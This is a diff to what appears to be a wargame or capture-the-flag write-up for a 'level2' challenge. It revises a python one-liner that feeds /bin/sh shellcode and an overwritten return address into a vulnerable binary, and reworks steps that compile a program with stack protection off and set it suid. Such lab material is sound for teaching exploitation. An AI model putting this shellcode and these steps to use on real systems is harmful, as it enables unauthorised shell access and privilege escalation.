@@ -181,22 +181,26 @@ cat /home/user/level3/.pass
 
 here is a convenient one-liner:
 
-(python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xcf'[::-1])" ; cat) | /home/user/level2/level2
+(python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xcf'[::-1])"; cat) | /home/user/level2/level2
 
 
 # ------------------------------------------------------------------------
-# Recreate the exploitable binary
+# Recreate the exploitable program
 # ------------------------------------------------------------------------
 
-# As user level3, compile the exploit in /tmp
-gcc source.c -fno-stack-protector -z execstack
+# As user level3:
 
-# Edit suid
-chmod u+s a.out
+    # Compile the program in /tmp
+    gcc source2.c -fno-stack-protector -z execstack -o ft_level2
 
-# Move the exploit to level3 home directory
-chmod +wx ~; mv a.out ~
+    # Edit suid
+    chmod u+s ft_level2
 
-# Now user level2 can run the exploit
-(python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xef'[::-1])" ; cat) | /home/user/level3/a.out
+    # Move the exploit to home directory
+    chmod +wx ~; mv ft_level2 ~
+
+# As user level2:
+
+    # Run the program
+    (python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xef'[::-1])"; cat) | /home/user/level3/ft_level2
 
